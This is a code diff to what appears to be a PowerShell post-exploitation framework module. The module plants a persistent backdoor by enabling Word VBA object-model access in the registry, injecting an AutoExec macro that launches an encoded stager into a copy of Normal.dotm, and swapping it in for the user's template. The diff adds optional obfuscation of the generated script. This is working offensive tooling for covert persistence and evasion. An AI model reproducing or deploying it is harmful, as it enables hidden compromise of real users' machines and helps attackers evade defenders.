@@ -1,3 +1,4 @@
+import os.path
 from lib.common import helpers
 
 
@@ -27,7 +28,7 @@ class Module:
 
             # True if the method doesn't touch disk/is reasonably opsec safe
             'OpsecSafe' : False,
-            
+
             # The minimum PowerShell version needed for the module to run
             'MinPSVersion' : '2',
 
@@ -91,7 +92,7 @@ class Module:
                     self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         listenerName = self.options['Listener']['Value']
 
@@ -122,7 +123,7 @@ class Module:
             launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
             encScript = launcher.split(" ")[-1]
 
-        if cleanup.lower() == 'true': 
+        if cleanup.lower() == 'true':
             script = "cd HKCU:\\SOFTWARE\\Microsoft\\Office\\;"
             script += "gci . | %{ if(Test-Path Registry::$(Join-Path $_ -ChildPath 'Word\Security')){if((gpv -Path Registry::$(Join-Path $_ -ChildPath 'Word\\Security') -Name AccessVBOM) -eq 1){sp -Path Registry::$(Join-Path $_ -ChildPath 'Word\\Security') -Name AccessVBOM -Value 0;}else{return;}}};"
             script += "cd $env:APPDATA'\\Microsoft\\Templates\\';"
@@ -131,6 +132,8 @@ class Module:
             script += "\"File Restored\""
             script += "}else{"
             script += "\"Backup normal.dotm not found\";}"
+            if obfuscate:
+                script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
             return script
 
         script = "[System.Reflection.Assembly]::LoadWithPartialName(\"Microsoft.Vbe.Interop\") | Out-Null;"
@@ -143,7 +146,7 @@ class Module:
         script += "cp Normal.dotm AbNormal.dotm;"
         script += "$doc = $word.Documents.Open(${env:APPDATA}+'\\Microsoft\\Templates\\AbNormal.dotm');"
         script += "$macro = $doc.VBProject.VBComponents.Add(1);"
-        script += "$code = \n" 
+        script += "$code = \n"
         script += "@\"\n"
         script += "sub AutoExec()\n"
         script += "Dim objShell As Object\n"
@@ -170,4 +173,9 @@ class Module:
         script += "mv Normal.dotm Normal.dotm.bak;"
         script += "mv AbNormal.dotm Normal.dotm;"
         script += "\"Finished\";"
+        if obfuscate:
+            script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
         return script
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        return
